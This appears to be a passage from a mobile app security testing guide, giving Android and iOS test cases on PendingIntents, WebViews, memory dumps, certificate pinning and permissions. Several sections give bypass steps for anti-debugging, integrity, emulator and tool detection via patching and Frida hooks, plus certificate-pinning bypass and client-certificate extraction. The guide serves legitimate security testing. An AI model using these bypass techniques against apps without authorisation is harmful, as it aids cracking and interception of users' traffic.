For example, in [A-156959408](https://android.googlesource.com/platform/frameworks/base/+/6ae2bd0e59636254c32896f7f01379d1d704f42d "A-156959408")(CVE-2020-0389), the base intent is implicit and also the `PendingIntent` is mutable, thus making it exploitable.

```java
private Notification createSaveNotification(Uri uri) {
    Intent viewIntent = new Intent(Intent.ACTION_VIEW)
            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION)
            .setDataAndType(uri, "video/mp4"); //Implicit Intent

//... skip ...


Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_android)
                .setContentTitle(getResources().getString(R.string.screenrecord_name))
                .setContentText(getResources().getString(R.string.screenrecord_save_message))
                .setContentIntent(PendingIntent.getActivity(
                        this,
                        REQUEST_CODE,
                        viewIntent,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION))     // Mutable PendingIntent.
                .addAction(shareAction)
                .addAction(deleteAction)
                .setAutoCancel(true);

```

## Dynamic Analysis

Frida can be used to hook the APIs used to get a `PendingIntent`. This information can be used to determine the code location of the call, which can be further used to perform static analysis as described above.

Here's an example of such a Frida script that can be used to hook the `PendingIntent.getActivity` function:

```javascript
var pendingIntent = Java.use('android.app.PendingIntent');

var getActivity_1 = pendingIntent.getActivity.overload("android.content.Context", "int", "android.content.Intent", "int");

getActivity_1.implementation = function(context, requestCode, intent, flags){
    console.log("[*] Calling PendingIntent.getActivity("+intent.getAction()+")");
    console.log("\t[-] Base Intent toString: " + intent.toString());
    console.log("\t[-] Base Intent getExtras: " + intent.getExtras());
    console.log("\t[-] Base Intent getFlags: " + intent.getFlags());
    return this.getActivity(context, requestCode, intent, flags);
}
```

This approach can be helpful when dealing with applications with large code bases, where determining the control flow can sometimes be tricky.
## Testing JavaScript Execution in WebViews

## Overview

To test for [JavaScript execution in WebViews](../../../Document/0x05h-Testing-Platform-Interaction.md#javascript-execution-in-webviews "JavaScript Execution in WebViews") check the app for WebView usage and evaluate whether or not each WebView should allow JavaScript execution. If JavaScript execution is required for the app to function normally, then you need to ensure that the app follows the all best practices.

## Static Analysis

To create and use a WebView, an app must create an instance of the `WebView` class.

```java
WebView webview = new WebView(this);
setContentView(webview);
webview.loadUrl("https://www.owasp.org/");
```

Various settings can be applied to the WebView (activating/deactivating JavaScript is one example). JavaScript is disabled by default for WebViews and must be explicitly enabled. Look for the method [`setJavaScriptEnabled`](https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled%28boolean%29 "setJavaScriptEnabled in WebViews") to check for JavaScript activation.

```java
webview.getSettings().setJavaScriptEnabled(true);
```

This allows the WebView to interpret JavaScript. It should be enabled only if necessary to reduce the attack surface to the app. If JavaScript is necessary, you should make sure that

- The communication to the endpoints consistently relies on HTTPS (or other protocols that allow encryption) to protect HTML and JavaScript from tampering during transmission.
- JavaScript and HTML are loaded locally, from within the app data directory or from trusted web servers only.
- The user cannot define which sources to load by means of loading different resources based on a user provided input.

To remove all JavaScript source code and locally stored data, clear the WebView's cache with [`clearCache`](https://developer.android.com/reference/android/webkit/WebView#clearCache%28boolean%29 "clearCache in WebViews") when the app closes.

Devices running platforms older than Android 4.4 (API level 19) use a version of WebKit that has several security issues. As a workaround, the app must confirm that WebView objects [display only trusted content](https://developer.android.com/training/articles/security-tips.html#WebView "WebView Best Practices") if the app runs on these devices.

## Dynamic Analysis

Dynamic Analysis depends on operating conditions. There are several ways to inject JavaScript into an app's WebView:

- Stored Cross-Site Scripting vulnerabilities in an endpoint; the exploit will be sent to the mobile app's WebView when the user navigates to the vulnerable function.
- Attacker takes a [Machine-in-the-Middle (MITM)](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) position and tampers with the response by injecting JavaScript.
- Malware tampering with local files that are loaded by the WebView.

To address these attack vectors, check the following:

- All functions offered by the endpoint should be free of [stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting "Stored Cross-Site Scripting").
- Only files that are in the app data directory should be rendered in a WebView (see test case "Testing for Local File Inclusion in WebViews").

- The HTTPS communication must be implemented according to best practices to avoid MITM attacks. This means:
    - all communication is encrypted via TLS,
    - the certificate is checked properly, and/or
    - the certificate should be pinned.
## Testing Enforced Updating

## Overview

To test for [enforced updating](../../../Document/0x05h-Testing-Platform-Interaction.md#enforced-updating "Enforced Updating") you need to check if the app has support for in-app updates and validate if it's properly enforced so that the user is not able to continue using the app without updating it first.

## Static analysis

The code sample below shows the example of an app-update:

```java
//Part 1: check for update
// Creates instance of the manager.
AppUpdateManager appUpdateManager = AppUpdateManagerFactory.create(context);

// Returns an intent object that you use to check for an update.
Task<AppUpdateInfo> appUpdateInfo = appUpdateManager.getAppUpdateInfo();

// Checks that the platform will allow the specified type of update.
if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE
      // For a flexible update, use AppUpdateType.FLEXIBLE
      && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)) {



                  //...Part 2: request update
                  appUpdateManager.startUpdateFlowForResult(
                     // Pass the intent that is returned by 'getAppUpdateInfo()'.
                     appUpdateInfo,
                     // Or 'AppUpdateType.FLEXIBLE' for flexible updates.
                     AppUpdateType.IMMEDIATE,
                     // The current activity making the update request.
                     this,
                     // Include a request code to later monitor this update request.
                     MY_REQUEST_CODE);



                     //...Part 3: check if update completed successfully
 @Override
 public void onActivityResult(int requestCode, int resultCode, Intent data) {
   if (myRequestCode == MY_REQUEST_CODE) {
     if (resultCode != RESULT_OK) {
       log("Update flow failed! Result code: " + resultCode);
       // If the update is cancelled or fails,
       // you can request to start the update again in case of forced updates
     }
   }
 }

 //..Part 4:
 // Checks that the update is not stalled during 'onResume()'.
// However, you should execute this check at all entry points into the app.
@Override
protected void onResume() {
  super.onResume();

  appUpdateManager
      .getAppUpdateInfo()
      .addOnSuccessListener(
          appUpdateInfo -> {
            ...
            if (appUpdateInfo.updateAvailability()
                == UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) {
                // If an in-app update is already running, resume the update.
                manager.startUpdateFlowForResult(
                    appUpdateInfo,
                    IMMEDIATE,
                    this,
                    MY_REQUEST_CODE);
            }
          });
}
}
```

>Source: [https://developer.android.com/guide/app-bundle/in-app-updates](https://developer.android.com/guide/app-bundle/in-app-updates "Support in-app updates")

## Dynamic analysis

In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store.
Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend.
Lastly, try modifying the version number of an app while intercepting its traffic using a MIMT proxy, and observe how the backend responds (including whether the change is recorded, for example).
## Memory Corruption Bugs

## Overview

## Static Analysis

There are various items to look for:

- Are there native code parts? If so: check for the given issues in the general memory corruption section. Native code can easily be spotted given JNI-wrappers, .CPP/.H/.C files, NDK or other native frameworks.
- Is there Java code or Kotlin code? Look for Serialization/deserialization issues, such as described in [A brief history of Android deserialization vulnerabilities](https://securitylab.github.com/research/android-deserialization-vulnerabilities "android deserialization").

Note that there can be Memory leaks in Java/Kotlin code as well. Look for various items, such as: BroadcastReceivers which are not unregistered, static references to `Activity` or `View` classes, Singleton classes that have references to `Context`, Inner Class references, Anonymous Class references, AsyncTask references, Handler references, Threading done wrong, TimerTask references. For more details, please check:

- [9 ways to avoid memory leaks in Android](https://android.jlelse.eu/9-ways-to-avoid-memory-leaks-in-android-b6d81648e35e "9 ways to avoid memory leaks in Android")
- [Memory Leak Patterns in Android](https://android.jlelse.eu/memory-leak-patterns-in-android-4741a7fcb570 "Memory Leak Patterns in Android").

## Dynamic Analysis

There are various steps to take:

- In case of native code: use Valgrind or Mempatrol to analyze the memory usage and memory calls made by the code.
- In case of Java/Kotlin code, try to recompile the app and use it with [Squares leak canary](https://github.com/square/leakcanary "Leakcanary").
- Check with the [Memory Profiler from Android Studio](https://developer.android.com/studio/profile/memory-profiler "Memory profiler") for leakage.
- Check with the [Android Java Deserialization Vulnerability Tester](https://github.com/modzero/modjoda "Android Java Deserialization Vulnerability Tester"), for serialization vulnerabilities.
## Testing Anti-Debugging Detection

## Bypassing Debugger Detection

There's no generic way to bypass anti-debugging: the best method depends on the particular mechanism(s) used to prevent or detect debugging and the other defenses in the overall protection scheme. For example, if there are no integrity checks or you've already deactivated them, patching the app might be the easiest method. In other cases, a hooking framework or kernel modules might be preferable.
The following methods describe different approaches to bypass debugger detection:

- Patching the anti-debugging functionality: Disable the unwanted behavior by simply overwriting it with NOP instructions. Note that more complex patches may be required if the anti-debugging mechanism is well designed.
- Using Frida or Xposed to hook APIs on the Java and native layers: manipulate the return values of functions such as `isDebuggable` and `isDebuggerConnected` to hide the debugger.
- Changing the environment: Android is an open environment. If nothing else works, you can modify the operating system to subvert the assumptions the developers made when designing the anti-debugging tricks.

### Bypassing Example: UnCrackable App for Android Level 2

When dealing with obfuscated apps, you'll often find that developers purposely "hide away" data and functionality in native libraries. You'll find an example of this in @MASTG-APP-0004.

At first glance, the code looks like the prior challenge. A class called `CodeCheck` is responsible for verifying the code entered by the user. The actual check appears to occur in the `bar` method, which is declared as a _native_ method.

```java
package sg.vantagepoint.uncrackable2;

public class CodeCheck {
    public CodeCheck() {
        super();
    }

    public boolean a(String arg2) {
        return this.bar(arg2.getBytes());
    }

    private native boolean bar(byte[] arg1) {
    }
}

    static {
        System.loadLibrary("foo");
    }
```

Please see [different proposed solutions for the Android Crackme Level 2](https://mas.owasp.org/crackmes/Android#android-uncrackable-l2 "Solutions Android Crackme Level 2") in GitHub.

## Effectiveness Assessment

Check for anti-debugging mechanisms, including the following criteria:

- Attaching jdb and ptrace-based debuggers fails or causes the app to terminate or malfunction.
- Multiple detection methods are scattered throughout the app's source code (as opposed to their all being in a single method or function).
- The anti-debugging defenses operate on multiple API layers (Java, native library functions, assembler/system calls).
- The mechanisms are somehow original (as opposed to being copied and pasted from StackOverflow or other sources).

Work on bypassing the anti-debugging defenses and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the anti-debugging code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your subjective assessment of the difficulty of bypassing the mechanisms?

If anti-debugging mechanisms are missing or too easily bypassed, make suggestions in line with the effectiveness criteria above. These suggestions may include adding more detection mechanisms and better integration of existing mechanisms with other defenses.
## Testing File Integrity Checks

## Bypassing File Integrity Checks

### Bypassing the application-source integrity checks

1. Patch the anti-debugging functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.
2. Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file instead of the modified file.
3. Use the kernel module to intercept file-related system calls. When the process attempts to open the modified file, return a file descriptor for the unmodified version of the file.

Refer to Method Hooking for examples of patching, code injection, and kernel modules.

### Bypassing the storage integrity checks

1. Retrieve the data from the device.
2. Alter the retrieved data and then put it back into storage.

## Effectiveness Assessment

**Application-source integrity checks:**

Run the app in an unmodified state and make sure that everything works. Apply simple patches to `classes.dex` and any .so libraries in the app package. Re-package and re-sign the app as described in the "Basic Security Testing" chapter, then run the app. The app should detect the modification and respond in some way. At the very least, the app should alert the user and/or terminate. Work on bypassing the defenses and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the anti-debugging code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?

**Storage integrity checks:**

An approach similar to that for application-source integrity checks applies. Answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by changing the contents of a file or a key-value)?
- How difficult is getting the HMAC key or the asymmetric private key?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?
## Testing Reverse Engineering Tools Detection

## Effectiveness Assessment

Launch the app with various reverse engineering tools and frameworks installed in your test device. Include at least the following: @MASTG-TOOL-0031, @MASTG-TOOL-0027.

The app should respond in some way to the presence of those tools. For example by:

- Alerting the user and asking for accepting liability.
- Preventing execution by gracefully terminating.
- Securely wiping any sensitive data stored on the device.
- Reporting to a backend server, e.g, for fraud detection.

Next, work on bypassing the detection of the reverse engineering tools and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the anti reverse engineering code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?

The following steps should guide you when bypassing detection of reverse engineering tools:

1. Patch the anti reverse engineering functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.
2. Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file, not the modified file.
3. Use a kernel module to intercept file-related system calls. When the process attempts to open the modified file, return a file descriptor for the unmodified version of the file.
## Testing Emulator Detection

## Bypassing Emulator Detection

1. Patch the emulator detection functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.
2. Use Frida or Xposed APIs to hook file system APIs on the Java and native layers. Return innocent-looking values (preferably taken from a real device) instead of the telltale emulator values. For example, you can override the `TelephonyManager.getDeviceID` method to return an IMEI value.

## Effectiveness Assessment

Install and run the app in the emulator. The app should detect that it is being executed in an emulator and terminate or refuse to execute the functionality that's meant to be protected.

Work on bypassing the defenses and answer the following questions:

- How difficult is identifying the emulator detection code via static and dynamic analysis?
- Can the detection mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- Did you need to write custom code to disable the anti-emulation feature(s)? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?
## Testing Obfuscation

## Overview

## Static Analysis

Decompile the APK (@MASTG-TECH-0017) and review it (@MASTG-TECH-0023) to determine whether the codebase has been obfuscated.

Below you can find a sample for an obfuscated code block:

```java
package com.a.a.a;

import com.a.a.b.a;
import java.util.List;

class a$b
  extends a
{
  public a$b(List paramList)
  {
    super(paramList);
  }

  public boolean areAllItemsEnabled()
  {
    return true;
  }

  public boolean isEnabled(int paramInt)
  {
    return true;
  }
}
```

Here are some considerations:

- Meaningful identifiers, such as class names, method names, and variable names, might have been discarded.
- String resources and strings in binaries might have been encrypted.
- Code and data related to the protected functionality might be encrypted, packed, or otherwise concealed.

For native code:

- [libc APIs](https://man7.org/linux/man-pages/dir_section_3.html) (e.g open, read) might have been replaced with OS [syscalls](https://man7.org/linux/man-pages/man2/syscalls.2.html).
- [Obfuscator-LLVM](https://github.com/obfuscator-llvm/obfuscator "Obfuscator-LLVM") might have been applied to perform ["Control Flow Flattening"](https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening) or ["Bogus Control Flow"](https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow).

Some of these techniques are discussed and analyzed in the blog post ["Security hardening of Android native code"](https://darvincitech.wordpress.com/2020/01/07/security-hardening-of-android-native-code/) by Gautam Arvind and in the ["APKiD: Fast Identification of AppShielding Products"](https://github.com/enovella/cve-bio-enovella/blob/master/slides/APKiD-NowSecure-Connect19-enovella.pdf) presentation by Eduardo Novella.

For a more detailed assessment, you need a detailed understanding of the relevant threats and the obfuscation methods used. Tools such as @MASTG-TOOL-0009 may give you additional indications about which techniques were used for the target app such as obfuscators, packers and anti-debug measures.

## Dynamic Analysis

You can use @MASTG-TOOL-0009 to detect if the app has been obfuscated.

Example using the @MASTG-APP-0015:

```sh
apkid mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk
[+] APKiD 2.1.2 :: from RedNaga :: rednaga.io
[*] mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk!classes.dex
 |-> anti_vm : Build.TAGS check, possible ro.secure check
 |-> compiler : r8
 |-> obfuscator : unreadable field names, unreadable method names
```

In this case it detects that the app has unreadable field names and method names, among other things.
## Determining Whether Sensitive Data Is Exposed via IPC Mechanisms

## Overview

## Static Analysis

The following section summarizes keywords that you should look for to identify IPC implementations within iOS source code.

### XPC Services

Several classes may be used to implement the NSXPCConnection API:

- NSXPCConnection
- NSXPCInterface
- NSXPCListener
- NSXPCListenerEndpoint

You can set [security attributes](https://www.objc.io/issues/14-mac/xpc/#security-attributes-of-the-connection "Security Attributes of NSXPCConnection") for the connection. The attributes should be verified.

Check for the following two files in the Xcode project for the XPC Services API (which is C-based):

- [`xpc.h`](https://developer.apple.com/documentation/xpc/xpc_services_xpc.h "xpc.h")
- `connection.h`

### Mach Ports

Keywords to look for in low-level implementations:

- mach\_port\_t
- mach\_msg\_*

Keywords to look for in high-level implementations (Core Foundation and Foundation wrappers):

- CFMachPort
- CFMessagePort
- NSMachPort
- NSMessagePort

### NSFileCoordinator

Keywords to look for:

- NSFileCoordinator

## Dynamic Analysis

Verify IPC mechanisms with static analysis of the iOS source code. No iOS tool is currently available to verify IPC usage.
## Testing Memory for Sensitive Data

## Overview

## Static Analysis

When performing static analysis for sensitive data exposed via memory, you should

- try to identify application components and map where the data is used,
- make sure that sensitive data is handled with as few components as possible,
- make sure that object references are properly removed once the object containing sensitive data is no longer needed,
- make sure that highly sensitive data is overwritten as soon as it is no longer needed,
- not pass such data via immutable data types, such as `String` and `NSString`,
- avoid non-primitive data types (because they might leave data behind),
- overwrite the value in memory before removing references,
- pay attention to third-party components (libraries and frameworks). Having a public API that handles data according to the recommendations above is a good indicator that developers considered the issues discussed here.

## Dynamic Analysis

There are several approaches and tools available for dynamically testing the memory of an iOS app for sensitive data.

### Retrieving and Analyzing a Memory Dump

Whether you are using a jailbroken or a non-jailbroken device, you can dump the app's process memory with @MASTG-TOOL-0038 and @MASTG-TOOL-0106. You can find a detailed explanation of this process in @MASTG-TECH-0044.

After the memory has been dumped (e.g. to a file called "memory"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command `strings` or `rabin2 -zz` from @MASTG-TOOL-0129 to extract those strings.

```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```

Open `strings.txt` in your favorite editor and dig through it to identify sensitive information.

However if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (`/?`) for more information and a list of options. The following shows only a subset of them:

```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```

### Runtime Memory Analysis

Perform @MASTG-TECH-0096, e.g., using @MASTG-TOOL-0036, to analyze and inspect the app's memory while running and without needing to dump it.

For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash `:` after starting the session with `r2 frida://usb//<name_of_your_app>`.
## Testing Endpoint Identity Verification

## Overview

## Static Analysis

Using TLS to transport sensitive information over the network is essential for security. However, encrypting communication between a mobile application and its backend API is not trivial. Developers often decide on simpler but less secure solutions (e.g., those that accept any certificate) to facilitate the development process, and sometimes these weak solutions make it into the production version, potentially exposing users to [Machine-in-the-Middle (MITM)](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) attacks. See ["CWE-295: Improper Certificate Validation"](https://cwe.mitre.org/data/definitions/295.html "CWE-295: Improper Certificate Validation").

These are some of the issues should be addressed:

- Check if the app links against an SDK older than iOS 9.0. In that case ATS is disabled no matter which version of the OS the app runs on.
- Verify that a certificate comes from a trusted source, i.e. a trusted CA (Certificate Authority).
- Determine whether the endpoint server presents the right certificate.

Make sure that the hostname and the certificate itself are verified correctly. Examples and common pitfalls are available in the [official Apple documentation](https://developer.apple.com/documentation/security/preventing_insecure_network_connections "Preventing Insecure Network Connections").

We highly recommend supporting static analysis with the dynamic analysis. If you don't have the source code or the app is difficult to reverse engineer, having a solid dynamic analysis strategy can definitely help. In that case you won't know if the app uses low or high-level APIs but you can still test for different trust evaluation scenarios (e.g. "does the app accept a self-signed certificate?").

## Dynamic Analysis

Our test approach is to gradually relax security of the SSL handshake negotiation and check which security mechanisms are enabled.

1. Having Burp set up as a proxy, make sure that there is no certificate added to the trust store (**Settings** -> **General** -> **Profiles**) and that tools like SSL Kill Switch are deactivated. Launch your application and check if you can see the traffic in Burp. Any failures will be reported under 'Alerts' tab. If you can see the traffic, it means that there is no certificate validation performed at all. If however, you can't see any traffic and you have an information about SSL handshake failure, follow the next point.
2. Now, install the Burp certificate, as explained in [Burp's user documentation](https://support.portswigger.net/customer/portal/articles/1841109-installing-burp-s-ca-certificate-in-an-ios-device "Installing Burp\'s CA Certificate in an iOS Device"). If the handshake is successful and you can see the traffic in Burp, it means that the certificate is validated against the device's trust store, but no pinning is performed.

If executing the instructions from the previous step doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. However, you still need to bypass the pinning in order to test the application. Please refer to @MASTG-TECH-0064 for more information on this.
## Testing Custom Certificate Stores and Certificate Pinning

## Overview

## Static Analysis

Verify that the server certificate is pinned. Pinning can be implemented on various levels in terms of the certificate tree presented by the server:

1. Including server's certificate in the application bundle and performing verification on each connection. This requires an update mechanisms whenever the certificate on the server is updated.
2. Limiting certificate issuer to e.g. one entity and bundling the intermediate CA's public key into the application. In this way we limit the attack surface and have a valid certificate.
3. Owning and managing your own PKI. The application would contain the intermediate CA's public key. This avoids updating the application every time you change the certificate on the server, due to e.g. expiration. Note that using your own CA would cause the certificate to be self-singed.

The latest approach recommended by Apple is to specify a pinned CA public key in the `Info.plist` file under App Transport Security Settings. You can find an example in their article [Identity Pinning: How to configure server certificates for your app](https://developer.apple.com/news/?id=g9ejcf8y "Identity Pinning: How to configure server certificates for your app").

Another common approach is to use the [`connection:willSendRequestForAuthenticationChallenge:`](https://developer.apple.com/documentation/foundation/nsurlconnectiondelegate/1414078-connection?language=objc "connection:willSendRequestForAuthenticationChallenge:") method of `NSURLConnectionDelegate` to check if the certificate provided by the server is valid and matches the certificate stored in the app. You can find more details in the [HTTPS Server Trust Evaluation](https://developer.apple.com/library/archive/technotes/tn2232/_index.html#//apple_ref/doc/uid/DTS40012884-CH1-SECNSURLCONNECTION "HTTPS Server Trust Evaluation") technical note.

The following third-party libraries include pinning functionality:

- [TrustKit](https://github.com/datatheorem/TrustKit "TrustKit"): here you can pin by setting the public key hashes in your Info.plist or provide the hashes in a dictionary. See their README for more details.
- [AlamoFire](https://github.com/Alamofire/Alamofire "AlamoFire"): here you can define a `ServerTrustPolicy` per domain for which you can define a `PinnedCertificatesTrustEvaluator`. See its [documentation](https://github.com/Alamofire/Alamofire/blob/master/Documentation/AdvancedUsage.md#security) for more details.
- [AFNetworking](https://github.com/AFNetworking/AFNetworking "AfNetworking"): here you can set an `AFSecurityPolicy` to configure your pinning.

## Dynamic Analysis

### Server certificate pinning

Follow the instructions from the Dynamic Analysis section of @MASTG-TEST-0067. If doing so doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. Does the same happen for all domains?

As a quick smoke test, you can try to bypass certificate pinning using @MASTG-TOOL-0038 as described in @MASTG-TECH-0064. Pinning related APIs being hooked by objection should appear in objection's output.

<img src="Images/Chapters/0x06b/ios_ssl_pinning_bypass.png" width="100%" />

However, keep in mind that:

- the APIs might not be complete.
- if nothing is hooked, that doesn't necessarily mean that the app doesn't implement pinning.

In both cases, the app or some of its components might implement custom pinning in a way that is [supported by objection](https://github.com/sensepost/objection/blob/master/agent/src/ios/pinning.ts). Please check the static analysis section for specific pinning indicators and more in-depth testing.

### Client certificate validation

Some applications use mTLS (mutual TLS), meaning that the application verifies the server's certificate and the server verifies the client's certificate. You can notice this if there is an error in Burp **Alerts** tab indicating that client failed to negotiate connection.

There are a couple of things worth noting:

1. The client certificate contains a private key that will be used for the key exchange.
2. Usually the certificate would also need a password to use (decrypt) it.
3. The certificate can be stored in the binary itself, data directory or in the Keychain.

The most common and improper way of using mTLS is to store the client certificate within the application bundle and hardcode the password. This obviously does not bring much security, because all clients will share the same certificate.

Second way of storing the certificate (and possibly password) is to use the Keychain. Upon first login, the application should download the personal certificate and store it securely in the Keychain.

Sometimes applications have one certificate that is hardcoded and use it for the first login and then the personal certificate is downloaded. In this case, check if it's possible to still use the 'generic' certificate to connect to the server.

Once you have extracted the certificate from the application (e.g. using Frida), add it as client certificate in Burp, and you will be able to intercept the traffic.
## Testing App Permissions

## Overview

## Static Analysis

Since iOS 10, these are the main areas which you need to inspect for permissions:

- Purpose Strings in the Info.plist File
- Code Signing Entitlements File
- Embedded Provisioning Profile File
- Entitlements Embedded in the Compiled App Binary
- Usage of Permissions in Source Code

### Purpose Strings in the Info.plist File

If having the original source code, you can verify the permissions included in the `Info.plist` file:

- Open the project with Xcode.
- Find and open the `Info.plist` file in the default editor and search for the keys starting with `"Privacy -"`.

You may switch the view to display the raw values by right-clicking and selecting "Show Raw Keys/Values" (this way for example `"Privacy - Location When In Use Usage Description"` will turn into `NSLocationWhenInUseUsageDescription`).

<img src="Images/Chapters/0x06h/purpose_strings_xcode.png" width="100%" />

If only having the IPA:

- Unzip the IPA.
- The `Info.plist` is located in `Payload/<appname>.app/Info.plist`.
- Convert it if needed (e.g. `plutil -convert xml1 Info.plist`) as explained in the chapter "iOS Basic Security Testing", section "The Info.plist File".
- Inspect all _purpose strings Info.plist keys_, usually ending with `UsageDescription`:

    ```xml
    <plist version="1.0">
    <dict>
        <key>NSLocationWhenInUseUsageDescription</key>
        <string>Your location is used to provide turn-by-turn directions to your destination.</string>
    ```

For each purpose string in the `Info.plist` file, check if the permission makes sense.

For example, imagine the following lines were extracted from a `Info.plist` file used by a Solitaire game:

```xml
<key>NSHealthClinicalHealthRecordsShareUsageDescription</key>
<string>Share your health data with us!</string>
<key>NSCameraUsageDescription</key>
<string>We want to access your camera</string>
```

It should be suspicious that a regular solitaire game requests this kind of resource access as it probably does not have any need for [accessing the camera](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/uid/TP40009251-SW24 "NSCameraUsageDescription") nor a [user's health-records](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/uid/TP40009251-SW76 "NSHealthClinicalHealthRecordsShareUsageDescription").

Apart from simply checking if the permissions make sense, further analysis steps might be derived from analyzing purpose strings e.g. if they are related to storage sensitive data. For example, `NSPhotoLibraryUsageDescription` can be considered as a storage permission giving access to files that are outside of the app's sandbox and might also be accessible by other apps. In this case, it should be tested that no sensitive data is being stored there (photos in this case). For other purpose strings like `NSLocationAlwaysUsageDescription`, it must be also considered if the app is storing this data securely. Refer to the "Testing Data Storage" chapter for more information and best practices on securely storing sensitive data.

### Embedded Provisioning Profile File

When you do not have the original source code, you should analyze the IPA and search inside for the _embedded provisioning profile_ that is usually located in the root app bundle folder (`Payload/<appname>.app/`) under the name `embedded.mobileprovision`.

This file is not a `.plist`, it is encoded using [Cryptographic Message Syntax](https://en.wikipedia.org/wiki/Cryptographic_Message_Syntax "Cryptographic Message Syntax"). On macOS you can [inspect an embedded provisioning profile's entitlements](https://developer.apple.com/library/archive/technotes/tn2415/_index.html#//apple_ref/doc/uid/DTS40016427-CH1-PROFILESENTITLEMENTS "Inspecting a profile\'s entitlements") using the following command:

```bash
security cms -D -i embedded.mobileprovision
```

and then search for the Entitlements key region (`<key>Entitlements</key>`).

### Entitlements Embedded in the Compiled App Binary

If you only have the app's IPA or simply the installed app on a jailbroken device, you normally won't be able to find `.entitlements` files. This could also be the case for the `embedded.mobileprovision` file. Still, you should be able to extract the entitlements property lists from the app binary yourself (see @MASTG-TECH-0111).

### Usage of Permissions in Source Code

After having checked the `<appname>.entitlements` file and the `Info.plist` file, it is time to verify how the requested permissions and assigned capabilities are put to use. For this, a source code review should be enough. However, if you don't have the original source code, verifying the use of permissions might be specially challenging as you might need to reverse engineer the app, refer to the "Dynamic Analysis" for more details on how to proceed.

When doing a source code review, pay attention to:

- whether the _purpose strings_ in the `Info.plist` file match the programmatic implementations.
- whether the registered capabilities are used in such a way that no confidential information is leaking.

Users can grant or revoke authorization at any time via "Settings", therefore apps normally check the authorization status of a feature before accessing it. This can be done by using dedicated APIs available for many system frameworks that provide access to protected resources.

You can use the [Apple Developer Documentation](https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc#3037319 "Check for Authorization") as a starting point. For example:

- Bluetooth: the [`state`](https://developer.apple.com/documentation/corebluetooth/cbmanager/1648600-state?language=objc "CBManager state") property of the [`CBCentralManager`](https://developer.apple.com/documentation/corebluetooth/cbcentralmanager?language=objc "CBCentralManager") class is used to check system-authorization status for using Bluetooth peripherals.
- Location: search for methods of `CLLocationManager`, e.g. [`locationServicesEnabled`](https://developer.apple.com/documentation/corelocation/cllocationmanager/1423648-locationservicesenabled?language=objc "CLLocationManager locationServicesEnabled").

    ```default
    func checkForLocationServices() {
        if CLLocationManager.locationServicesEnabled() {
            // Location services are available, so query the user's location.
        } else {
            // Update your app's UI to show that the location is unavailable.
        }
    }
    ```

    See Table1 in ["Determining the Availability of Location Services"](https://developer.apple.com/documentation/corelocation/adding_location_services_to_your_app "Getting the availability of Core Location services") (Apple Developer Documentation) for a complete list.

